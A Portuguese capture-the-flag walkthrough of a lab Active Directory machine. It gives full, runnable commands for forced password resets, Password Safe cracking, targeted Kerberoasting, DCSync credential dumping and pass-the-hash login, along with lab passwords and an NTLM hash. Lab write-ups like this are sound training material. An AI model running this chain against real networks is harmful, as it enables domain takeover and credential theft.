#Difficult : Medium
#OS : Linux
#Info : As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: ``Olivia`` Password: ``ichliebedich``
***
# Port Scanning
Como sempre começamos escaneando as portas abertas na máquina para termos uma noção de quais serviços estão rodando na máquina.
```bash
nmap 10.10.11.42 -sC -Pn -sV -A -oN nmap_output_tcp
```
![[Pasted image 20250410175652.png]]
Encontramos alguns serviços  sendo os mais interessantes `FTP : 21`, `SMB : 445`, `LDAP : 389` e `kerberos : 88`.
***
# FTP and SMB Recon
Agora faço a enumeração do `FTP` e `SMB` para ver se tenho acesso e se há algo de importante.
```bash
netexec ftp 10.10.11.42 -u 'olivia' -p 'ichliebedich'

netexec smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --shares
```
![[Pasted image 20250410182955.png]]
Aparentemente não temos acesso ao `FTP` nem acesso a alguma pasta interessante no `SMB`.
***
# Lateral Movement
Primeiro faço um mapeamento de quais usuários regulares existem no sistema.
```bash
evil-winrm -i 10.10.11.42 -u 'Olivia' -p 'ichliebedich'

ls ../../
```
![[Pasted image 20250410201913.png]]
Aparentemente só temos 2 usuários regulares : `olivia` | `emily`.

Agora fazemos o mapeamento das relações do `AD` e analisamos no `BloodHound`.
```bash
mkdir hound_collection && hound_collection
bloodhound-python -u 'Olivia' -p 'ichliebedich' -d 'administrator.htb' -ns '10.10.11.42' -c All
```
![[Pasted image 20250410184015.png]]

``Olivia`` tem permissão `GenericAll` sob `Michael`, o que nos permite definirmos sua senha. Podemos trocar e já verificar suas permissões.
![[Pasted image 20250410184548.png]]
```bash
bloodyAd --host 'administrator.htb' -u 'olivia' -p 'ichliebedich' set password 'michael' '12345678'
```
![[Pasted image 20250410190409.png]]

`Michael` tem permissões de `ForceChangePassword` sob `Benjamin`, o que também nos permite trocar sua senha. Então novamente podemos trocar a senha.
![[Pasted image 20250410185238.png]]
```bash
bloodyAd --host 'administrator.htb' -u 'michael' -p '12345678' set password 'benjamin' '12345678'
```
![[Pasted image 20250410190428.png]]

`Benjamin` não tem permissões interessantes para usarmos.
![[Pasted image 20250410201554.png]]
***
# Password Database Cracking
Agora que temos mais dois usuários, podemos verificar novamente o `FTP` e `SMB`.
```bash
cd ../
echo 'michael\nbenjamin' > users.list

netexec smb 10.10.11.42 -u ./users.list -p '12345678' --shares

netexec ftp 10.10.11.42 -u ./users.list -p '12345678' --ls
```
![[Pasted image 20250410191820.png]]
No caso do `SMB`  não temos acesso a pastas interessantes, mas no caso do `FTP` temos acesso a um arquivo de backup de senhas.

Esses arquivos costumam ser protegidos por senhas, então baixamos e extraímos o hash da senha para usarmos como o `john`.
```bash
netexec ftp 10.10.11.42 -u 'benjamin' -p '12345678' --get 'Backup.psafe3'

pwsafe2john Backup.psafe3 > backup.hash
john --format=pwsafe backup.hash --wordlist=../rockyou.txt
john backup.hash --show
```
![[Pasted image 20250410192903.png]]

Agora podemos abrir o arquivo e usarmos a senha que acabamos de conseguir.
```bash
pwsafe ./Backup.psafe3
```
![[Pasted image 20250410193321.png]]

Como o usuário `emily` é o único que existe no sistema, começamos copiando sua senha e fazendo logon no sistema.
![[Pasted image 20250410193435.png]]

Agora que temos a senha de `emily` podemos logar.
```bash
evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

ls ../Desktop
```
![[Pasted image 20250410193756.png]]
Conseguimos a flag de usuário.
***
# Kerberoasting 
Também podemos vemos suas permissões no `BloodHound`.
![[Pasted image 20250410194313.png]]
`Emily` tem permissões de `GenericWrite` sob `ethan`, o que nos permite um `Kerberoasting`.

Primeiro executamos o `Kerberoasting` para obtermos o `TGS` de `ethan`, e em seguida quebramos a hash com o `hashcat`.
```bash
targetedKerberoast -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42
```
![[Pasted image 20250410195020.png]]

Obtivemos um erro de horário, o Kerberos é muito chato em relação a isso. Podemos então sincronizar nosso horário com o `DC`.
```bash
timedatectl set-ntp off
rdate -n 10.10.11.42
targetedKerberoast -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42
```
![[Pasted image 20250410195819.png]]

Agora jogamos o hash `TGS` em um arquivo `ethan.tgs` e quebramos com o `hashcat`.
```bash
hashcat -m 13100 ./ethan.tgs ../rockyou.txt --show
```
![[Pasted image 20250410200130.png]]
***
# PRIV ESC - DCSync
Agora que temos a senha de `ethan` vamos ver suas permissões no `BloodHound`.![[Pasted image 20250410200505.png]]

`Ethan` tem permissões `GetChanges` e `GetChangesAll` sob `administrator.htb`, a combinação dessas duas permissões nos possibilita executar um `DCSync`. 

Usarei o `impacket-secretsdump` que se utiliza do `DCSync` para obter as `hashes` dos usuários e pegar a `hash` do usuário `Administrator`.
```bash
impacket-secretsdump "administrator.htb/ethan:limpbizkit"@"dc.administrator.htb"
```
![[Pasted image 20250410201051.png]]

Então podemos logar como `Administrator` e obter a flag.
```bash
evil-winrm -i 10.10.11.42 -u administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"
```
![[Pasted image 20250410201211.png]]

**Owned!**
***

![[Pasted image 20250410201318.png]]